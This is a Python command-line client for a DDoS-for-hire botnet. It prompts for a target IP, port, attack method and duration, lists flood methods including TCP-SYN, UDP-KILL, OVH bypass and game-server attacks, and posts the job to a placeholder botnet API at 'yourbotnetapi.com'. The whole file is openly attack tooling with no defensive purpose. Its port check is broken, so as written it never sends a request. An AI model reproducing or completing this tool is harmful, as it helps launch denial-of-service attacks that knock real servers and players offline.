import requests


TCPMETHOD = ["TCP", "TCP-X", "TCP-SYN", "TCP-KILL"]
UDPMETHOD = ["UDP", "UDP-KILL"]
OVHMETHOD = ["OVH", "OVH-KILL", "OVH-TCP", "OVH-UDP", "OVH-ICMP"]
ONEHUNDEREDUPMETHODD = ["100UP", "100UP-KILL"]
GAMEMETHOD = ["GAME", "APEX", "FN", "R6S"]

def setup_attack():
    server_ip = input("[+] IP: ")
    server_port = input("[+] Port: ")
    attack_type = input("[+] Attack Type: ")
    duration = input("[+] Duration Of Attack: ")
    attack(server_address=server_ip, server_port=server_port, attack_type=attack_type, duration=duration)

def attack(server_address, server_port, attack_type, duration):

    if(isinstance(server_port, int) == False):
        print("[+] Invalid Port Number")
        return
    if(server_port > 65535):
        print("[+] Invalid Port Number")
        setup_attack()

    if attack_type in TCPMETHOD:
        print(f"[+] TCP METHOD {attack_type} SELECTED")
    elif attack_type in UDPMETHOD:
        print(f"[+] UDP METHOD {attack_type} SELECTED")
    elif attack_type in OVHMETHOD:
        print(f"[+] OVH METHOD {attack_type} SELECTED")
    elif attack_type in ONEHUNDEREDUPMETHODD:
        print(f"[+] 100UP METHOD {attack_type} SELECTED")
    elif attack_type in GAMEMETHOD:
        print(f"[+] GAME METHOD {attack_type} SELECTED")
    else:
        print(" ")
        print("[-] Invalid Attack Method Selected")
        list_methods = input("[!] Would you like a list of methods [y/n]: ")
        if(list_methods == "y" or list_methods == "Y"):
            print(" ")
            print("[!] TCP Methods: ")
            for methods in TCPMETHOD:
                print(f"[+] {methods}")
            print(" ")
            print("[!] UDP Methods: ")
            for methods in UDPMETHOD:
                print(f"[+] {methods}")
            print(" ")
            print("[!] OVH Methods")
            for methods in OVHMETHOD:
                print(f"[+] {methods}")
            print(" ")
            print("[!] 100UP Methods: ")
            for methods in ONEHUNDEREDUPMETHODD:
                print(f"[+] {methods}")
            print(" ")
            print("[!] Game Methods: ")
            for methods in GAMEMETHOD:
                print(f"[+] {methods}")
        setup_attack()
    # Change to make sure it is correct api link
    requests.post(f"https://yourbotnetapi.com/?address={server_address}&port={server_port}&type={attack_type}&dur={duration}")
    print(f"[+] Sending attack to {server_address} On {server_port} Using {attack_type} For {duration}")
        
if __name__ == "__main__":
    setup_attack()
